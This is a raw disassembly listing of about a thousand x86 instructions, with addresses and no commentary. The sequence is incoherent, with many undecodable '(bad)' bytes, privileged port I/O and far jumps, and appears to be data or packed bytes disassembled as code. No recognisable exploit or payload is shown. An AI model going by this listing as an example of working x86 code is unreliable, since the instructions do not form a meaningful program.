  41d965:	outs   dx,DWORD PTR ds:[esi]
  41d966:	cwde   
  41d967:	add    al,0x72
  41d969:	sbb    BYTE PTR [ebp+0xa],0xf4
  41d96d:	jae    0x41d946
  41d96f:	dec    ebp
  41d970:	push   esp
  41d971:	add    eax,0xda1b80c
  41d976:	add    eax,eax
  41d978:	(bad)  
  41d979:	stc    
  41d97a:	aas    
  41d97b:	loop   0x41d992
  41d97d:	fld    DWORD PTR [ebp+0x7b]
  41d980:	xor    edi,ebx
  41d982:	inc    ecx
  41d983:	rol    BYTE PTR [eax+0x1ec1b36a],1
  41d989:	test   eax,0x8fd1c085
  41d98e:	adc    ch,BYTE PTR [eax]
  41d990:	and    DWORD PTR [ecx+0x373809f8],0x68
  41d997:	loopne 0x41d94d
  41d999:	repnz push 0x62dab3a5
  41d99f:	in     al,dx
  41d9a0:	push   eax
  41d9a1:	adc    eax,0x5fbae53f
  41d9a6:	fiadd  WORD PTR [ebp-0x1e]
  41d9a9:	xor    BYTE PTR [esi+0x6b],al
  41d9ac:	jle    0x41d9c1
  41d9ae:	mov    ds:0x367254f9,eax
  41d9b3:	add    al,0xab
  41d9b5:	adc    DWORD PTR [eax],0x2b
  41d9b8:	jg     0x41da34
  41d9ba:	(bad)  
  41d9bb:	adc    DWORD PTR ds:0xc5abd50d,esp
  41d9c1:	jae    0x41d971
  41d9c3:	out    0xc7,eax
  41d9c5:	and    esp,DWORD PTR [esi]
  41d9c7:	push   edi
  41d9c8:	add    DWORD PTR cs:[ecx+0x18289a67],edx
  41d9cf:	add    al,0x2a
  41d9d1:	aad    0x5c
  41d9d3:	sbb    al,0xba
  41d9d5:	pop    ebp
  41d9d6:	pushf  
  41d9d7:	js     0x41da49
  41d9d9:	push   ebx
  41d9da:	out    0x8c,eax
  41d9dc:	push   0x9f2edead
  41d9e1:	sub    bl,cl
  41d9e3:	push   cs
  41d9e4:	cmp    BYTE PTR [esi+0x7e],cl
  41d9e7:	mov    cl,0xd
  41d9e9:	and    DWORD PTR [ebx],edi
  41d9eb:	ins    BYTE PTR es:[edi],dx
  41d9ec:	and    edx,DWORD PTR [ebp+0xca25316]
  41d9f2:	mov    al,0x9
  41d9f4:	push   eax
  41d9f5:	in     al,0xd0
  41d9f7:	push   eax
  41d9f8:	dec    edx
  41d9f9:	mov    ecx,0x23c462a8
  41d9fe:	xor    DWORD PTR ds:0xed86729d,ecx
  41da04:	mov    al,ds:0x35360882
  41da09:	add    ecx,DWORD PTR [edi+0x75dba905]
  41da0f:	sbb    eax,0xc67562cf
  41da14:	dec    ebp
  41da15:	cwde   
  41da16:	int    0xee
  41da18:	scas   al,BYTE PTR es:[edi]
  41da19:	int3   
  41da1a:	repz scas eax,DWORD PTR es:[edi]
  41da1c:	fsub   st,st(2)
  41da1e:	jge    0x41da7b
  41da20:	fdiv   DWORD PTR [ebp-0x19]
  41da23:	inc    esp
  41da24:	das    
  41da25:	xchg   ecx,eax
  41da26:	jmp    0x41d9f5
  41da28:	push   esp
  41da29:	cld    
  41da2a:	fdiv   DWORD PTR [ebx+0x6b34d7bf]
  41da30:	lahf   
  41da31:	adc    al,0x70
  41da33:	add    esi,DWORD PTR [edi]
  41da35:	imul   ebp,ebp,0xbd12e42b
  41da3b:	lods   al,BYTE PTR ds:[esi]
  41da3c:	add    al,0xce
  41da3e:	shr    BYTE PTR [edi+0x19e52d57],cl
  41da44:	xor    edx,DWORD PTR [edx+0x52]
  41da47:	data16 test ch,0x6b
  41da4b:	bnd fs jb 0x41da37
  41da4f:	mov    bl,BYTE PTR [esi+esi*1]
  41da52:	cmp    ch,BYTE PTR [esi-0x44]
  41da55:	or     eax,0x92102323
  41da5a:	jo     0x41da20
  41da5c:	cmp    eax,0x2200308d
  41da61:	lahf   
  41da62:	(bad)
  41da66:	jo     0x41dae3
  41da68:	repnz sub al,0xae
  41da6b:	lea    ecx,[edi]
  41da6d:	mov    bh,BYTE PTR [edx]
  41da6f:	fisub  WORD PTR cs:[eax-0x20]
  41da73:	lahf   
  41da74:	jne    0x41daa4
  41da76:	cli    
  41da77:	scas   eax,DWORD PTR es:[edi]
  41da78:	out    dx,eax
  41da79:	jecxz  0x41da11
  41da7b:	std    
  41da7c:	out    0xd9,al
  41da7e:	pop    esp
  41da7f:	adc    bh,BYTE PTR [ecx-0x3ed1b5eb]
  41da85:	cmc    
  41da86:	sbb    BYTE PTR [ebx+0x32],al
  41da89:	xor    DWORD PTR [ebx+0x54398320],eax
  41da8f:	sbb    al,0xd8
  41da91:	jg     0x41da4e
  41da93:	(bad)  
  41da94:	call   0x6beb:0x71278e91
  41da9b:	fld    QWORD PTR [ebx-0x5072bd94]
  41daa1:	push   ecx
  41daa2:	outs   dx,BYTE PTR ds:[esi]
  41daa3:	inc    esi
  41daa4:	or     bl,BYTE PTR [ebx]
  41daa6:	clc    
  41daa7:	mov    edi,0x2acbc074
  41daac:	sub    eax,0x4a0ed2cd
  41dab1:	push   cs
  41dab2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41dab3:	ds xor eax,0x42b73ab9
  41dab9:	mov    ch,0x13
  41dabb:	scas   eax,DWORD PTR es:[edi]
  41dabc:	out    0xc4,al
  41dabe:	cli    
  41dabf:	sti    
  41dac0:	out    dx,eax
  41dac1:	ret    0x6404
  41dac4:	and    al,0xa
  41dac6:	jo     0x41daf0
  41dac8:	add    bh,BYTE PTR [esi]
  41daca:	xor    BYTE PTR [esi+esi*1-0x7c21aad0],cl
  41dad1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41dad2:	mov    ah,BYTE PTR [ecx+ecx*2+0x61f72f74]
  41dad9:	mov    ?,WORD PTR [ebp-0x60fd1b6f]
  41dadf:	jo     0x41da6c
  41dae1:	ja     0x41db50
  41dae3:	push   esi
  41dae4:	jmp    0x41db08
  41dae6:	lahf   
  41dae7:	in     al,0x84
  41dae9:	fld    TBYTE PTR [edx]
  41daeb:	and    esi,DWORD PTR [esi]
  41daed:	test   BYTE PTR [esi+0x5e61de7e],0xb2
  41daf4:	out    dx,eax
  41daf5:	test   BYTE PTR [ebx+ebx*8+0x5e646afe],ah
  41dafc:	dec    edi
  41dafd:	sub    BYTE PTR [ecx-0x1b],dl
  41db00:	adc    ebp,0x2c6de0bf
  41db06:	in     eax,dx
  41db07:	mov    BYTE PTR [eax+0x79],bl
  41db0a:	and    dh,BYTE PTR [esp+ecx*4-0x37]
  41db0e:	xchg   DWORD PTR [edx+0x39],esi
  41db11:	test   eax,0x474e2ef5
  41db16:	jge    0x41db3e
  41db18:	outs   dx,DWORD PTR ds:[esi]
  41db19:	jae    0x41db96
  41db1b:	(bad)  
  41db1c:	shr    BYTE PTR ss:[edi],1
  41db1f:	das    
  41db20:	inc    ebp
  41db21:	add    BYTE PTR ds:0xd3f04ec8,bl
  41db27:	sbb    dh,cl
  41db29:	out    dx,eax
  41db2a:	mov    edx,0x420254cf
  41db2f:	je     0x41daf4
  41db31:	dec    ebp
  41db32:	outs   dx,DWORD PTR ds:[esi]
  41db33:	and    eax,0xf7378181
  41db38:	cld    
  41db39:	mov    ebx,0x27a68172
  41db3e:	pop    ds
  41db3f:	bound  ebp,QWORD PTR [eax]
  41db41:	pop    ds
  41db42:	dec    edi
  41db43:	gs jne 0x41db4b
  41db46:	and    ebp,DWORD PTR [edi]
  41db48:	or     BYTE PTR [ebp+0x36],al
  41db4b:	pop    es
  41db4c:	and    al,0x62
  41db4e:	enter  0x2ad3,0x25
  41db52:	fidiv  WORD PTR [edi]
  41db54:	fdivrp st(7),st
  41db56:	sub    ch,cl
  41db58:	push   ecx
  41db59:	mov    bl,BYTE PTR [edi+0x47]
  41db5c:	ds mov ecx,0x8ac2fa0e
  41db62:	jg     0x41dbd9
  41db64:	cli    
  41db65:	adc    DWORD PTR [ebx+0x7aa9bd71],0x6351abb
  41db6f:	and    DWORD PTR [ecx],0x60
  41db72:	mov    al,0x75
  41db74:	sbb    ecx,esp
  41db76:	jmp    0xe875e94
  41db7b:	or     ch,BYTE PTR [esi-0x2fc1428f]
  41db81:	inc    ebx
  41db82:	into   
  41db83:	push   0xc
  41db85:	out    0xb1,al
  41db87:	push   eax
  41db88:	and    bh,0x84
  41db8b:	adc    eax,0x8a540fee
  41db90:	and    eax,0xbcc19053
  41db95:	push   ecx
  41db96:	jge    0x41db88
  41db98:	mov    esp,0x3dcec32b
  41db9e:	push   0xffffff96
  41dba0:	dec    esi
  41dba1:	jb     0x41dba5
  41dba3:	fs pop edx
  41dba5:	ins    BYTE PTR es:[edi],dx
  41dba6:	mov    eax,0xce007a83
  41dbab:	adc    esi,ecx
  41dbad:	aam    0x6a
  41dbaf:	fisubr DWORD PTR [eax-0xd]
  41dbb2:	jne    0x41dbf9
  41dbb4:	int3   
  41dbb5:	or     al,0x6e
  41dbb7:	je     0x41dc32
  41dbb9:	push   ds
  41dbba:	or     esp,DWORD PTR [esi-0x71]
  41dbbd:	push   esp
  41dbbe:	aaa    
  41dbbf:	lods   eax,DWORD PTR ds:[esi]
  41dbc0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41dbc1:	xchg   edi,eax
  41dbc2:	lods   al,BYTE PTR ds:[esi]
  41dbc3:	mov    dh,0x7f
  41dbc5:	sub    BYTE PTR [edi-0x5d9d3727],ah
  41dbcb:	or     dh,0xfa
  41dbce:	into   
  41dbcf:	out    0xa3,al
  41dbd1:	pusha  
  41dbd2:	cmp    BYTE PTR cs:[eax-0x5c],ch
  41dbd6:	into   
  41dbd7:	fldenv [ebx]
  41dbd9:	push   eax
  41dbda:	test   bh,bl
  41dbdc:	popf   
  41dbdd:	xor    al,0x95
  41dbdf:	pop    eax
  41dbe0:	xor    ecx,esp
  41dbe2:	out    0x51,eax
  41dbe4:	aad    0x57
  41dbe6:	rcr    BYTE PTR [ebp+0x4c77f72a],0xb5
  41dbed:	repnz icebp 
  41dbef:	nop
  41dbf0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41dbf1:	dec    ebx
  41dbf2:	jmp    0x3b10:0x9484bd51
  41dbf9:	faddp  st(0),st
  41dbfc:	in     al,dx
  41dbfd:	mov    esi,0x8b721d1f
  41dc02:	pop    ebx
  41dc03:	xchg   esp,eax
  41dc04:	adc    BYTE PTR [esp-0x7d02c46a],cl
  41dc0b:	cld    
  41dc0c:	mov    ecx,0xfd24c499
  41dc11:	mov    ds:0x8c020015,al
  41dc16:	aas    
  41dc17:	pusha  
  41dc18:	(bad)  
  41dc19:	out    0xf7,al
  41dc1b:	sub    ebx,DWORD PTR [ecx+0x44501e52]
  41dc21:	fstp   TBYTE PTR [eax]
  41dc23:	sub    ch,BYTE PTR [ebx-0x5e85a17b]
  41dc29:	out    dx,al
  41dc2a:	or     al,0x0
  41dc2c:	fs cmc 
  41dc2e:	iret   
  41dc2f:	pop    esp
  41dc30:	(bad)  
  41dc31:	cli    
  41dc32:	jmp    0x74bd90a3
  41dc37:	je     0x41dbfe
  41dc39:	pop    ebx
  41dc3a:	add    bl,BYTE PTR [ebp+0x1f]
  41dc3d:	mov    bl,0x9c
  41dc3f:	enter  0xb297,0x50
  41dc43:	mov    ds:0x2e8ccf39,al
  41dc48:	(bad)  
  41dc49:	js     0x41dbe1
  41dc4b:	ret    0xbf9b
  41dc4e:	lock jg 0x41dc19
  41dc51:	adc    eax,0xe3c37271
  41dc56:	and    DWORD PTR [esi],esi
  41dc58:	cmp    DWORD PTR [esi-0xe],ebp
  41dc5b:	fiadd  DWORD PTR es:[edi+0x11]
  41dc5f:	cli    
  41dc60:	or     DWORD PTR [edx],ecx
  41dc62:	sbb    eax,0x46b5f299
  41dc67:	fwait
  41dc68:	adc    eax,esp
  41dc6a:	adc    BYTE PTR [eax-0x44b02b18],al
  41dc70:	lock loop 0x41dcd8
  41dc73:	sbb    al,0xf9
  41dc75:	push   0x5d495d77
  41dc7a:	retf   0x707f
  41dc7d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41dc7e:	xor    BYTE PTR [edi-0xbce72a1],cl
  41dc84:	jmp    0xed18b6d1
  41dc89:	imul   DWORD PTR [esp+esi*8-0x1d97bc86]
  41dc90:	pop    ecx
  41dc91:	or     ebp,ecx
  41dc93:	(bad)  
  41dc94:	lods   eax,DWORD PTR ds:[esi]
  41dc95:	je     0x41dccc
  41dc97:	sub    BYTE PTR [edx+0xb2437c5],0xf9
  41dc9e:	in     eax,0x20
  41dca0:	xchg   esi,eax
  41dca1:	int3   
  41dca2:	cli    
  41dca3:	or     edi,esp
  41dca5:	in     eax,0xf1
  41dca7:	test   DWORD PTR [esi+edx*2-0x1b],ebp
  41dcab:	outs   dx,DWORD PTR ds:[esi]
  41dcac:	jmp    0x41dd28
  41dcae:	cld    
  41dcaf:	out    dx,eax
  41dcb0:	dec    eax
  41dcb1:	adc    al,0x73
  41dcb3:	or     al,BYTE PTR [ebx-0x1f]
  41dcb6:	or     BYTE PTR [ecx],bl
  41dcb8:	mov    bh,0x46
  41dcba:	iret   
  41dcbb:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41dcbc:	sbb    eax,edi
  41dcbe:	iret   
  41dcbf:	adc    bh,BYTE PTR [ebx+0x25]
  41dcc2:	cli    
  41dcc3:	in     al,dx
  41dcc4:	jne    0x41dd03
  41dcc6:	pushf  
  41dcc7:	(bad)  
  41dcc8:	out    dx,eax
  41dcc9:	mov    dl,0x35
  41dccb:	nop
  41dccc:	into   
  41dccd:	imul   eax,DWORD PTR ds:0x53810144,0x2b
  41dcd4:	lock pushf 
  41dcd6:	sub    ch,cl
  41dcd8:	stos   BYTE PTR es:[edi],al
  41dcd9:	cmp    eax,0xc13f7c7c
  41dcde:	enter  0xd637,0xb
  41dce2:	nop
  41dce3:	xor    bh,bh
  41dce5:	inc    edi
  41dce6:	jbe    0x41dcf3
  41dce8:	sub    eax,0x54ec3898
  41dced:	dec    ebx
  41dcee:	dec    edx
  41dcef:	adc    edi,DWORD PTR ds:0x7da9d54e
  41dcf5:	pushf  
  41dcf6:	shl    DWORD PTR [edi-0x72],0x26
  41dcfa:	adc    eax,0xcbc95e6f
  41dcff:	outs   dx,DWORD PTR ds:[esi]
  41dd00:	jbe    0x41dd1e
  41dd02:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41dd03:	xchg   ecx,eax
  41dd04:	fstp   TBYTE PTR [eax-0x133d8227]
  41dd0a:	cmp    bl,cl
  41dd0c:	call   0xb1851759
  41dd11:	jecxz  0x41dd49
  41dd13:	shr    esi,1
  41dd15:	push   0xffffffe8
  41dd17:	iret   
  41dd18:	and    eax,0xd33d79bc
  41dd1d:	inc    edx
  41dd1e:	loop   0x41dd5f
  41dd20:	sub    BYTE PTR [edx+edx*1+0x547f5677],al
  41dd27:	aas    
  41dd28:	xor    BYTE PTR [eax-0x6cb2ed99],cl
  41dd2e:	jmp    0xa1e785fd
  41dd33:	ret    0x6866
  41dd36:	lods   al,BYTE PTR ds:[esi]
  41dd37:	repnz mov ds:0xf1d1a6bd,eax
  41dd3d:	daa    
  41dd3e:	xor    ecx,DWORD PTR [eiz*1-0x744f1bb7]
  41dd45:	ret    0x42e4
  41dd48:	pop    eax
  41dd49:	mov    ch,0xa3
  41dd4b:	lea    esp,[esi+0x25180a3f]
  41dd51:	ins    BYTE PTR es:[edi],dx
  41dd52:	xchg   ebx,eax
  41dd53:	dec    edi
  41dd54:	popa   
  41dd55:	scas   eax,DWORD PTR es:[edi]
  41dd56:	xchg   ebx,eax
  41dd57:	sbb    BYTE PTR [ecx],0xcc
  41dd5a:	ds fcmovb st,st(3)
  41dd5d:	push   ecx
  41dd5e:	pop    ebx
  41dd5f:	inc    esi
  41dd60:	cli    
  41dd61:	cmp    dl,BYTE PTR [ebx+eax*8]
  41dd64:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41dd65:	push   ds
  41dd66:	(bad)  
  41dd67:	aam    0x1b
  41dd69:	outs   dx,DWORD PTR ds:[esi]
  41dd6a:	push   ss
  41dd6b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41dd6c:	aaa    
  41dd6d:	push   esp
  41dd6e:	jb     0x41dd48
  41dd70:	stc    
  41dd71:	xchg   edi,eax
  41dd72:	sub    eax,0xa9d55bd2
  41dd77:	pop    eax
  41dd78:	sub    ebp,0xa92bc67
  41dd7e:	icebp  
  41dd7f:	ja     0x41dd52
  41dd81:	xor    DWORD PTR [edx-0x66622483],ecx
  41dd87:	aaa    
  41dd88:	inc    esi
  41dd89:	retf   
  41dd8a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41dd8b:	test   eax,0x305cbc0b
  41dd90:	cmp    eax,0x35412793
  41dd95:	js     0x41dd2a
  41dd97:	out    dx,eax
  41dd98:	mov    ?,WORD PTR [eax]
  41dd9a:	mov    edi,0x69d29ba5
  41dd9f:	xor    eax,0x603a08b5
  41dda4:	inc    edx
  41dda5:	in     eax,dx
  41dda6:	shr    DWORD PTR [ecx],1
  41dda8:	mov    ds,WORD PTR [ebp+0x62]
  41ddab:	sub    ecx,eax
  41ddad:	popf   
  41ddae:	scas   eax,DWORD PTR es:[edi]
  41ddaf:	push   ecx
  41ddb0:	das    
  41ddb1:	add    ah,0xb2
  41ddb4:	xor    BYTE PTR [edi+0x260b1ae7],cl
  41ddba:	add    eax,0xcd53601b
  41ddbf:	test   al,0xd3
  41ddc1:	cmp    ecx,DWORD PTR [esp+ecx*4-0x28c818e]
  41ddc8:	xor    ebx,DWORD PTR [ebp-0xd]
  41ddcb:	sbb    al,0x88
  41ddcd:	imul   eax,edi,0x6d111404
  41ddd3:	xchg   esi,eax
  41ddd4:	mov    esi,0x37263b13
  41ddd9:	sbb    ch,BYTE PTR [ebx+eax*1-0x53869f24]
  41dde0:	ins    DWORD PTR es:[edi],dx
  41dde1:	mov    edi,0x3e359e
  41dde6:	inc    edx
  41dde7:	fbld   TBYTE PTR [eax+ecx*2+0x79be7522]
  41ddee:	cmp    ax,0xeb1d
  41ddf2:	xchg   edx,eax
  41ddf3:	es sbb eax,0x57720679
  41ddf9:	mov    edx,DWORD PTR [ebx+ecx*1]
  41ddfc:	adc    eax,0x34ae3acc
  41de01:	aaa    
  41de02:	adc    ebp,ecx
  41de04:	ds lock mov bl,dl
  41de08:	int3   
  41de09:	aad    0x32
  41de0b:	cmc    
  41de0c:	inc    edx
  41de0d:	inc    ebx
  41de0e:	mov    al,0x12
  41de10:	pop    ebx
  41de11:	in     al,0xf0
  41de13:	jmp    0x41ddf6
  41de15:	ja     0x41ddc8
  41de17:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41de18:	xor    cl,BYTE PTR [edx]
  41de1a:	clc    
  41de1b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41de1c:	pop    es
  41de1d:	out    dx,eax
  41de1e:	pop    edx
  41de1f:	mov    al,0xc3
  41de21:	push   cs
  41de22:	xor    BYTE PTR [ebp-0x78],0x33
  41de26:	inc    ebp
  41de27:	aad    0xb3
  41de29:	(bad)  
  41de2a:	cmp    al,0x83
  41de2c:	(bad)  
  41de2d:	jmp    0x41de5e
  41de2f:	loop   0x41ddf8
  41de31:	icebp  
  41de32:	pushf  
  41de33:	sbb    DWORD PTR [edi],esi
  41de35:	mov    ds:0x6fa71335,al
  41de3a:	mov    eax,ds:0x80126b9f
  41de3f:	arpl   di,bp
  41de41:	test   BYTE PTR [ebp-0x67],al
  41de44:	fs out dx,eax
  41de46:	jns    0x41de76
  41de48:	sub    eax,0x8cd5c03a
  41de4d:	aam    0xae
  41de4f:	pop    ds
  41de50:	frstor [edx-0x64]
  41de53:	int3   
  41de54:	mov    ds:0xe27875bd,al
  41de59:	scas   eax,DWORD PTR es:[edi]
  41de5a:	xchg   DWORD PTR [eax+0x78],ecx
  41de5d:	dec    esp
  41de5e:	sub    eax,edi
  41de60:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41de61:	int    0x25
  41de63:	(bad)  
  41de64:	dec    esp
  41de65:	imul   esi,DWORD PTR [eax],0xffffffc4
  41de68:	add    al,0x89
  41de6a:	mov    eax,0xd6dc0318
  41de6f:	mov    ecx,0xb78da59d
  41de74:	in     eax,0x84
  41de76:	outs   dx,DWORD PTR ds:[esi]
  41de77:	not    ch
  41de79:	pusha  
  41de7a:	pop    es
  41de7b:	lahf   
  41de7c:	test   DWORD PTR [ebx],0x6d972a37
  41de82:	icebp  
  41de83:	fwait
  41de84:	adc    BYTE PTR [ebx-0x6a25d4f4],ah
  41de8a:	loope  0x41de9c
  41de8c:	fmul   st,st(1)
  41de8e:	cs jmp 0x41de57
  41de91:	inc    edx
  41de92:	inc    eax
  41de93:	test   eax,0x65be7e5c
  41de98:	int3   
  41de99:	test   eax,0x828e1de3
  41de9e:	fiadd  DWORD PTR [eax+edx*4+0x319baa51]
  41dea5:	and    BYTE PTR [edx],bl
  41dea7:	xlat   BYTE PTR ds:[ebx]
  41dea8:	jno    0x41df28
  41deaa:	push   esi
  41deab:	call   0xf644:0x8927e630
  41deb2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41deb3:	xor    eax,0x29cc6b4b
  41deb8:	out    0xc9,eax
  41deba:	aad    0x24
  41debc:	cmc    
  41debd:	fmulp  st(3),st
  41debf:	inc    edi
  41dec0:	test   eax,0xb80075b8
  41dec5:	test   BYTE PTR [edi-0x7d],ch
  41dec8:	js     0x41df41
  41deca:	or     BYTE PTR [eax+esi*2+0x5d],dh
  41dece:	pop    esi
  41decf:	mov    esi,0xe8d16df1
  41ded4:	idiv   edx
  41ded6:	mov    BYTE PTR [eax+esi*2-0x3e],dl
  41deda:	inc    eax
  41dedb:	push   ss
  41dedc:	xor    eax,ecx
  41dede:	scas   al,BYTE PTR es:[edi]
  41dedf:	and    esi,eax
  41dee1:	sbb    eax,0xfefa81e0
  41dee6:	adc    bh,ah
  41dee8:	xchg   ebx,esi
  41deea:	imul   ebx,ebp,0x4cb80619
  41def0:	jnp    0x41df66
  41def2:	inc    esp
  41def3:	sbb    al,0xf4
  41def5:	push   ebx
  41def6:	dec    edi
  41def7:	call   0xa1f8cf72
  41defc:	or     DWORD PTR [esi+0x17d23aa3],0xffffff88
  41df03:	add    BYTE PTR [edx+0x5e7e2c11],0x54
  41df0a:	in     eax,0x68
  41df0c:	mov    ecx,DWORD PTR [edi+eiz*1]
  41df0f:	sbb    eax,0x862b4466
  41df14:	push   ss
  41df15:	pop    edi
  41df16:	sub    DWORD PTR [esi],0xffffff8d
  41df19:	mov    esi,0x7b5a56bd
  41df1e:	mov    ebx,0x89a4673e
  41df23:	and    eax,0x460ed70b
  41df28:	push   edi
  41df29:	cli    
  41df2a:	ja     0x41df43
  41df2c:	adc    ecx,DWORD PTR [edx-0x7e]
  41df2f:	clc    
  41df30:	sub    al,0x8f
  41df32:	mov    ecx,ebx
  41df34:	cmp    al,0xc1
  41df36:	mov    edx,0x3bf7e8d1
  41df3b:	and    eax,0x8662f8e9
  41df40:	je     0x41df75
  41df42:	into   
  41df43:	adc    al,0x5e
  41df45:	mov    ch,0x72
  41df47:	ret    
  41df48:	pop    ecx
  41df49:	lods   eax,DWORD PTR ds:[esi]
  41df4a:	adc    al,BYTE PTR [ecx]
  41df4c:	push   0xa2d84354
  41df51:	jle    0x41dfb3
  41df53:	pop    ds
  41df54:	inc    ecx
  41df55:	je     0x41dfca
  41df57:	push   cs
  41df58:	stc    
  41df59:	sub    eax,0x78e8c474
  41df5e:	outs   dx,DWORD PTR ds:[esi]
  41df5f:	or     BYTE PTR [edi+0x37],0x83
  41df63:	or     al,0x82
  41df65:	ss or  dl,cl
  41df68:	pop    ecx
  41df69:	das    
  41df6a:	inc    edx
  41df6b:	or     BYTE PTR [ebx],al
  41df6d:	cmp    al,0x5
  41df6f:	sub    esi,ebp
  41df71:	scas   al,BYTE PTR es:[edi]
  41df72:	add    ecx,DWORD PTR [ebx-0x49]
  41df75:	das    
  41df76:	cmp    edx,DWORD PTR [edi]
  41df78:	xchg   edi,eax
  41df79:	inc    eax
  41df7a:	xchg   edx,eax
  41df7b:	cmp    al,0x47
  41df7d:	int    0x91
  41df7f:	scas   eax,DWORD PTR es:[edi]
  41df80:	test   al,0x76
  41df82:	adc    esp,DWORD PTR [ecx]
  41df84:	hlt    
  41df85:	test   eax,0x680813d6
  41df8a:	mov    eax,0x9f2e5534
  41df8f:	push   DWORD PTR [ebx+0x5c]
  41df92:	jno    0x41df2d
  41df94:	icebp  
  41df95:	xor    eax,0xf23dbaca
  41df9a:	add    DWORD PTR [ebp+0xe],edx
  41df9d:	inc    ecx
  41df9e:	sbb    DWORD PTR [eax+0x56f0ec47],0x9efba7e2
  41dfa8:	and    esi,ebx
  41dfaa:	jmp    0x41df4b
  41dfac:	inc    esi
  41dfad:	mov    cl,0x30
  41dfaf:	fsubr  DWORD PTR [ebx+0x12f3ae56]
  41dfb5:	mov    al,ds:0x8c46a4f8
  41dfba:	in     al,dx
  41dfbb:	xchg   ebp,eax
  41dfbc:	not    edi
  41dfbe:	in     eax,0xbc
  41dfc0:	mov    ds:0x952814a1,al
  41dfc5:	or     al,0x25
  41dfc7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41dfc8:	lods   al,BYTE PTR ds:[esi]
  41dfc9:	or     eax,0x2efd9171
  41dfce:	dec    edx
  41dfcf:	out    0x15,al
  41dfd1:	fwait
  41dfd2:	dec    esi
  41dfd3:	shl    dh,1
  41dfd5:	dec    eax
  41dfd6:	add    edi,DWORD PTR [eax+0x735004d6]
  41dfdc:	adc    al,BYTE PTR [ebx-0x73]
  41dfdf:	into   
  41dfe0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41dfe1:	iret   
  41dfe2:	lds    esp,FWORD PTR [edx-0x32]
  41dfe5:	lahf   
  41dfe6:	pop    eax
  41dfe7:	adc    eax,0xea718b4c
  41dfec:	mov    ebx,0xe278bfab
  41dff1:	mov    WORD PTR [edi],ss
  41dff3:	push   edi
  41dff4:	sub    al,BYTE PTR [edi-0x42f950e7]
  41dffa:	or     BYTE PTR [ebx+0x30a131bb],ah
  41e000:	out    dx,al
  41e001:	mov    es,eax
  41e003:	pop    esp
  41e004:	jp     0x41e005
  41e006:	or     ah,ch
  41e008:	lock cmp esi,DWORD PTR [edi]
  41e00b:	fst    DWORD PTR [edi-0x4d]
  41e00e:	pop    ds
  41e00f:	pop    ss
  41e010:	adc    edx,esp
  41e012:	scas   eax,DWORD PTR es:[edi]
  41e013:	aam    0xd1
  41e015:	aad    0x3
  41e017:	mov    bh,0x99
  41e019:	aam    0x9e
  41e01b:	mov    ds,WORD PTR [ecx+0x54a58816]
  41e021:	push   ebp
  41e022:	jmp    0x4c4e:0x87a7c33d
  41e029:	jb     0x41e071
  41e02b:	int3   
  41e02c:	mov    al,ds:0x2cf42f46
  41e031:	push   ebx
  41e032:	or     eax,0xdd480638
  41e037:	ins    DWORD PTR es:[edi],dx
  41e038:	scas   eax,DWORD PTR es:[edi]
  41e039:	xor    DWORD PTR [esp+ecx*1],eax
  41e03c:	inc    edx
  41e03d:	adc    DWORD PTR [eax-0x79],0x4c59f169
  41e044:	pop    ecx
  41e045:	sbb    ecx,DWORD PTR [ebp-0x17a3a8d5]
  41e04b:	pushf  
  41e04c:	or     al,0xa3
  41e04e:	retf   
  41e04f:	sub    eax,DWORD PTR [edx]
  41e051:	push   esp
  41e052:	mov    ds:0xb306b577,eax
  41e057:	jge    0x41e055
  41e059:	dec    esi
  41e05a:	pop    edx
  41e05b:	retf   
  41e05c:	repz inc ebx
  41e05e:	jnp    0x41e0bb
  41e060:	retf   0x216e
  41e063:	xor    ebp,DWORD PTR [esi-0x37]
  41e066:	gs ja  0x6f12c563
  41e06d:	fldpi  
  41e06f:	and    esi,DWORD PTR [edi+ebp*4+0x1a]
  41e073:	call   DWORD PTR [edi-0x38]
  41e076:	or     esp,ecx
  41e078:	or     eax,0x6f0aace7
  41e07d:	sbb    edi,ecx
  41e07f:	shl    DWORD PTR [esp+edi*1],cl
  41e082:	js     0x41e033
  41e084:	xchg   esp,eax
  41e085:	xor    bl,ch
  41e087:	(bad)  
  41e088:	inc    edi
  41e089:	ds and al,0x9e
  41e08c:	sbb    al,0x24
  41e08e:	mov    eax,ds:0xec8d6bbd
  41e093:	sub    ebp,esi
  41e095:	dec    ebp
  41e096:	dec    DWORD PTR [edi+0x4a]
  41e099:	xchg   esp,eax
  41e09a:	xchg   esi,eax
  41e09b:	lahf   
  41e09c:	lods   al,BYTE PTR ds:[esi]
  41e09d:	stos   DWORD PTR es:[edi],eax
  41e09e:	mov    al,ds:0x9e61b2d
  41e0a3:	das    
  41e0a4:	sbb    esp,0x6c
  41e0a7:	mov    bh,0xf
  41e0a9:	xchg   ebx,eax
  41e0aa:	imul   edi,DWORD PTR [eax],0x28
  41e0ad:	sub    ah,BYTE PTR [edx+esi*8]
  41e0b0:	sahf   
  41e0b1:	lahf   
  41e0b2:	cdq    
  41e0b3:	add    BYTE PTR [edx-0x77692a82],cl
  41e0b9:	jmp    0x41e07e
  41e0bb:	pop    ss
  41e0bc:	pop    ebp
  41e0bd:	xchg   ecx,eax
  41e0be:	add    al,0x44
  41e0c0:	outs   dx,DWORD PTR ds:[esi]
  41e0c1:	adc    BYTE PTR [eax+0x27],ah
  41e0c4:	test   eax,0x36586512
  41e0c9:	repz shl BYTE PTR [ecx-0x49],0x1f
  41e0ce:	(bad)  [ecx+esi*2+0x18fcf2e8]
  41e0d5:	ins    DWORD PTR es:[edi],dx
  41e0d6:	xor    esp,esp
  41e0d8:	int3   
  41e0d9:	daa    
  41e0da:	mov    edx,0xc96408d5
